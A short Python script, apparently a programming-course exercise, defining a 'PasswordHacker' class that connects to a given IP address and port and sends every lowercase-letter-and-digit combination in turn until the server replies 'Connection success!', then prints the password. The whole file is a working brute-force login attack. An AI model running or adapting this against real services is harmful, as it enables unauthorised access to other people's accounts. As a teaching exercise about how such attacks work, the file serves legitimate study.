import sys
import socket
import itertools
import string


class PasswordHacker:

    def __init__(self):
        self.get_params()

    def get_params(self):
        self.ip_address = sys.argv[1]
        self.port = int(sys.argv[2])
        # self.message = sys.argv[3]

    def make_request(self):
        with socket.socket() as hack_socket:
            hack_socket.connect((self.ip_address, self.port))
            hack_socket.send(self.message.encode())
            self.response_raw = hack_socket.recv(1024)
            self.response = self.response_raw.decode()

    def find_password_brute(self):
        with socket.socket() as hack_socket:
            hack_socket.connect((self.ip_address, self.port))
            for message in self.pass_brute():
                hack_socket.send(message.encode())
                response_raw = hack_socket.recv(1024)
                response = response_raw.decode()
                if response == 'Connection success!':
                    self.password = message
                    print(self.password)
                    return self.password

    def show_response(self):
        print(self.response)

    def pass_brute(self):
        n = 1
        letter_number = string.ascii_lowercase + string.digits
        while True:
            for i in itertools.product(letter_number, repeat=n):
                yield ''.join(i)
            n += 1


hack = PasswordHacker()
hack.find_password_brute()
# hack.show_response()
